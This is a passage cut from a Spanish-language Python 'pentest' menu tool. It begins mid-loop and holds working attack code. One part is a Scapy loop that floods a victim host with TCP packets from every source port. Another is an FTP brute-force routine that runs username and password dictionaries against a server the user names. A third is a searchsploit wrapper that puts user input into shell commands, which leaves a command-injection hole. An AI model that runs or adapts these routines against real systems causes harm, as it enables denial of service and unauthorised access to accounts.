						for origen_port in range(1,65535):
							IP1 = IP(src=src, dst=victima)
							TCP1 = TCP(sport = origen_port, dport = puerto_dst)
							pkt = IP1 / TCP1
							send(pkt, inter = .001)
							print (colored("Paquete "+ str(i) + " enviado",'green',attrs=['bold']))
							i = i + 1
			else:
				print("Modo de ataque incorrecto")
				explotacion()
		if opcionfase3 == 2:

			time.sleep(2)
			os.system('clear')

			print(colored("License GPL                                                     ", 'blue', attrs=['bold']))
			print(colored("--------------------------------------------------------------------------", 'green', attrs=['bold']))
			print(colored(" _______  _______  _______  _______  _______  ______    _______  _______  ", 'red', attrs=['bold']))
			print(colored("|       ||       ||       ||       ||       ||    _ |  |       ||       | ", 'red', attrs=['bold']))
			print(colored("|    ___||_     _||    _  ||    ___||   _   ||   | ||  |       ||    ___| ", 'red', attrs=['bold']))
			print(colored("|   |___   |   |  |   |_| ||   |___ |  | |  ||   |_||_ |       ||   |___  ", 'red', attrs=['bold']))
			print(colored("|    ___|  |   |  |    ___||    ___||  |_|  ||    __  ||      _||    ___| ", 'red', attrs=['bold']))
			print(colored("|   |      |   |  |   |    |   |    |       ||   |  | ||     |_ |   |___  ", 'red', attrs=['bold']))
			print(colored("|___|      |___|  |___|    |___|    |_______||___|  |_||_______||_______| ", 'red', attrs=['bold']))
			print(colored("------------------ Author: TOTEKINGPADI ----------------------------------", 'green', attrs=['bold']))


			def brute(ip, users_file, passwords_file):
				try:
					ud = open(users_file, "r", encoding='utf-8-sig')
					pd = open(passwords_file, "r", encoding='utf-8-sig')

					users = ud.readlines()
					passwords = pd.readlines()

					for user in users:
						for password in passwords:
							try:
								print(colored("[+] Intentando conectar...", 'blue', attrs=['bold']))
								connect = ftplib.FTP(ip)
								response = connect.login(user.strip(), password.strip())
								print(response)

								if (response == "230 Login successful."):
									print(
										colored("[+] Ataque exitoso\nUsuario: " + user + "Password: " + password + "!",
												'green', attrs=['bold']))
									sys.exit()
								else:
									pass
							except ftplib.error_perm:
								print(colored(
									"[-] Fallo en el intento brute force\nUsuario: " + user + "Password: " + password + "...",
									'red', attrs=['bold']))
								connect.close()
				except(KeyboardInterrupt):
					print(colored("Interrumpido!", 'red', attrs=['bold']))
					sys.exit()


			ip = input("Introduce IP del servidor FTP a atacar: ")
			users_file = input("Introduce diccionario de usuarios (Ej: users.txt): ")
			passwords_file = input("Introduce diccionario de passwords (Ej: passwords.txt): ")

			brute(ip, users_file, passwords_file)

		elif opcionfase3 == 3:

			time.sleep(2)
			os.system('clear')

			searchsploit()
			try:
				opcionexploit = int(input("\nIntroduce un opcion: "))
			except ValueError:
				print("No has seleccionado una opcion correcta")
				searchsploit()

			if opcionexploit == 1:
				titulo=input("Introduce titulo para buscar exploit. (Ej: java)(Ej: java windows): ")
				subprocess.call("searchsploit -t '%s'" %titulo, shell=True)

			elif opcionexploit == 2:

				ruta_completa=input("Introduce exploit. (Ej: 39166): ")
				subprocess.call("searchsploit -p '%s'" %ruta_completa, shell=True)

			elif opcionexploit == 3:

				exploitdb=input("Introduce version exploit. (Ej: ubuntu 14.04): ")
				subprocess.call("searchsploit '%s' -w" %exploitdb, shell=True)

			elif opcionexploit == 4:

				menu_pentest()

	elif opcion == 4:
		print("\nSaliendo...")
		break

def main():

	menu_pentest()

if __name__ == '__main__':
	main()
